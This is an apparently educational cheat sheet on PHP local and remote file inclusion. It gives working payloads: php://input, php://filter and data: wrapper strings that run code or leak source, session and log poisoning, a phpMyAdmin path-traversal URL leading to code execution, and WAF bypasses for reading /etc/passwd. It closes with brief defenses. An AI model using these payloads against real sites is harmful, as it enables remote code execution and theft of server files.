# File Inclusion    
Scene: Attacker can control the variable which can be used to include files  
Dangerous functions：  
PHP: `include()`, `include_once()`, `require()`, `require_once()`, `fopen()`, `readfile()`  
JSP: `java.io.FileReader()`  
ASP: `includefile`  
PHP will run the content of file as php script when it includes a file, so it is **not influenced by file type**.    

# RFI  
Include remote file, more dangerous, but more requirement, mostly dissapear in real world  
`php.ini` setting  
1. allow_url_fopen = on (default: on)  
2. allow_url_include = on (default: off)  

# Way to include  
1. php protocol  
```php
php://input
// Condition：allow_url_include = on
?file=php://input
POST data: xxx

php://filter
// get source code
?file=php://filter/read=convert.base64-encode/resource=file.php
// filter can be used on handling string, take a look at the reference#1
php://filter/read=string.strip_tags/resource=php://input

phar://path.zip/file.php
// php5.3.0up, parse the archived file

zip://path.zip%23file.php
// php5.3.0up, work as phar://, but need absolute path, and need to encode # as %23

data:URL schema
// php5.2up, two settings in php.ini set to on
?file=data:text/plain,<?php phpinfo();?>
?file=data:text/plain,<?php system(ls);?>
?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b (base64 encode phpinfo)
```  
More protocol：`file://`,`ftp://`,`zlib://`,`glob://`,`ssh2://`,`rar://`,`ogg://`,`expect://`  

2. Session inclusion  
We can control the content of session, and we also know the path of session...  
Path of session can be got from `session_save_path` in phpinfo  
Place of stored session：  
```php
/var/lib/php/sess_xxxxx
/var/lib/php/sessions/sess_xxxx
/tmp/sess_xxxxxx
/tmp/sessions/sess_xxxxx
```  
CVE：  
phpmyadmin from LFI to RCE  
```php
xxx/phpmyadmin/index.php?target=xxx.php%253F/../../../../../var/lib/php/sessions/sess_xxxxxx
```  
3. Log inclusion  
**Permission** to read the log?  
Take apache for example, request would be written to `access.log`, and error would be written to `error.log`. The default stored path is `/var/log/apache2/`  
Therefore, attacker always needs to get the path via config file, and pay attention to whether the request would be encoded (use burp to modify the encoded request), then include the log in the end  
4. SSH log inclusion  
**Permission** to read？  
Default path: `/var/log/apache2/access.log`,`/var/log/apache2/error.log`  
```php
ssh '<?php phpinfo();?>'@remotehost
// phpinfo in log, and include
```  
5. include environ  
6. include fd  
7. include temp file  
8. include uploaded file  

# WAF bypass  
* Relative path bypass  
WAF usually detect **continuous** multiple `../`
```php
// according to parsing path

// not change
/./ not change
///./..//.//////./   -> use with conbination
```  
* Absolute path bypass, `/etc/passwd` would be blocked  
```php
/aaa/../etc/passwd
/etc/./passwd
```

# Defense  
Make a conclusion of the requirement above, we can get the following mitigation  
* php `open_basedir`  
* read permission  
* filter of dangerous characters  

# Reference  
1. [Phith0n 谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
